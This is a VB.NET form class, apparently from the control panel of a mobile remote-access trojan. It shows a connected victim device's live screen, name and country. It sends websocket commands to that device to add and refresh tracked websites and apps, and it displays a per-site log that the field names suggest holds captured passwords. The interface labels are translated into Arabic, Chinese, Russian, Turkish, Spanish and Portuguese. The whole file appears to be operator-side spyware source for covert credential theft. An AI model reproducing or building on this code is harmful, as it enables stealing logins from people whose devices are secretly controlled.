Imports System.Net.Sockets
Imports System.Threading

Public Class Tracker
    Public SiteData As New Dictionary(Of String, String)
    Public Btcli As BTClient
    Private Sub translateme()
        Select Case BTRegistry.GetValue(Regz.Language, "null")

            Case "AR"
                refpasses.Text = "تحديث"
                rembtn.Text = "حذف"
                addnum.Text = "إضافة"
                namemonitor.Text = "الأسم"
                linkmonitor.Text = "الرابط" 'website link
                idmonitor.Text = "معرف التطبيق" 'app id
                passtextlog.Text = "• إختر موقع من القائمة"
                clrbtn.Text = "تنظف"
                Exit Select
            Case "CN" ' Chinese
                refpasses.Text = "刷新"
                rembtn.Text = "删除"
                addnum.Text = "添加"
                namemonitor.Text = "名称"
                linkmonitor.Text = "链接" 'website link
                idmonitor.Text = "应用程序 ID" 'app id
                passtextlog.Text = "• 从列表中选择一个位置"
                clrbtn.Text = "清理"
                Exit Select

            Case "RU" ' Russian
                refpasses.Text = "Обновить"
                rembtn.Text = "Удалить"
                addnum.Text = "Добавить"
                namemonitor.Text = "Имя"
                linkmonitor.Text = "Ссылка" 'website link
                idmonitor.Text = "ID приложения" 'app id
                passtextlog.Text = "• Выберите место из списка"
                clrbtn.Text = "Очистить"
                Exit Select

            Case "TR" ' Turkish
                refpasses.Text = "Yenile"
                rembtn.Text = "Sil"
                addnum.Text = "Ekle"
                namemonitor.Text = "Adı"
                linkmonitor.Text = "Bağlantı" 'website link
                idmonitor.Text = "Uygulama Kimliği" 'app id
                passtextlog.Text = "• Listeden bir konum seçin"
                clrbtn.Text = "Temizle"
                Exit Select
            Case "SP" ' Spanish
                refpasses.Text = "Actualizar"
                rembtn.Text = "Eliminar"
                addnum.Text = "Agregar"
                namemonitor.Text = "Nombre"
                linkmonitor.Text = "Enlace" 'website link
                idmonitor.Text = "ID de la aplicación" 'app id
                passtextlog.Text = "• Seleccione una ubicación de la lista"
                clrbtn.Text = "Limpiar"
                Exit Select

            Case "PR" ' Brazilian Portuguese
                refpasses.Text = "Atualizar"
                rembtn.Text = "Remover"
                addnum.Text = "Adicionar"
                namemonitor.Text = "Nome"
                linkmonitor.Text = "Link" 'website link
                idmonitor.Text = "ID do aplicativo" 'app id
                passtextlog.Text = "• Selecione uma localização da lista"
                clrbtn.Text = "Limpar"
                Exit Select

            Case Else
                ' Handle any other cases or defaults here
        End Select
    End Sub
    Private Sub listsites_SelectedIndexChanged(sender As Object, e As EventArgs) Handles listsites.SelectedIndexChanged
        Try
            Dim selectedSite As String = listsites.SelectedItem.ToString

            If selectedSite = "All" Then
                ' Show aggregated log
                passtextlog.Text = String.Join("", SiteData.Values)
            ElseIf SiteData.ContainsKey(selectedSite) Then
                ' Show specific site's log
                passtextlog.Text = SiteData(selectedSite)
            Else
                passtextlog.Text = "No data available for this site."
            End If
        Catch ex As Exception

        End Try
    End Sub

    Private Sub refpasses_Click(sender As Object, e As EventArgs) Handles refpasses.Click
        Dim chatData As New Dictionary(Of String, Object) From {
                           {"msg", "brows"},
                           {"subc", "n"},
                           {"extdata", "0"},
                           {"ltype", "lp"},
                           {"lfor", "trk"}
        }
        BTEngine.commands(chatData, Btcli.mobid, BTEngine.MainForm.webSocketClient)
    End Sub

    Private Sub addnum_Click(sender As Object, e As EventArgs) Handles addnum.Click
        Dim nametrack As String = namemonitor.Text
        Dim linktrack As String = linkmonitor.Text
        Dim idtrack As String = idmonitor.Text
        ' Validation for Tracking Name
        If String.IsNullOrEmpty(nametrack) Then
            BTAlerter.infos("Add tracking name first.")
            namemonitor.Focus()
            Return
        End If

        ' Validation for URL and Link
        If (String.IsNullOrEmpty(linktrack)) Then
            BTAlerter.infos("Add tracking link first.")
            linkmonitor.Focus()
            Return
        End If

        Dim chatData As New Dictionary(Of String, Object) From {
                          {"msg", "brows"},
                          {"subc", "n"},
                          {"extdata", "0"},
                          {"ltype", "add"},
                          {"ntrk", nametrack},
                          {"ltrk", linktrack},
                          {"itrk", idtrack}
        }
        BTEngine.commands(chatData, Btcli.mobid, BTEngine.MainForm.webSocketClient)

    End Sub

    Private Sub DrakeUIButtonIcon1_Click(sender As Object, e As EventArgs) Handles rembtn.Click

    End Sub

    Private Sub Tracker_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        Me.myscr.Image = Btcli.screen
        Me.myico.Image = Btcli.wallpaper
        Me.mytitle.Text = Trackingstr & " | " & Btcli.name & " | " & Btcli.country
        translateme()
        statetimer.Start()
    End Sub

    Private Sub statetimer_Tick(sender As Object, e As EventArgs) Handles statetimer.Tick

        Try
            If Btcli.isConnected Then
                Me.myscr.Image = Btcli.screen
                Me.myico.Image = Btcli.wallpaper
                Me.mytitle.Text = Trackingstr & " | " & Btcli.name & " | " & Btcli.country

            Else
                Me.myico.Image = My.Resources.no_con
                Me.myscr.Image = Nothing
                Me.mytitle.Text = Profilestr & " | " & BTConst.Disconnectedstr

            End If
        Catch ex As Exception

        End Try
    End Sub

    Private Sub Tracker_FormClosing(sender As Object, e As FormClosingEventArgs) Handles MyBase.FormClosing
        statetimer.Stop()
    End Sub
End Class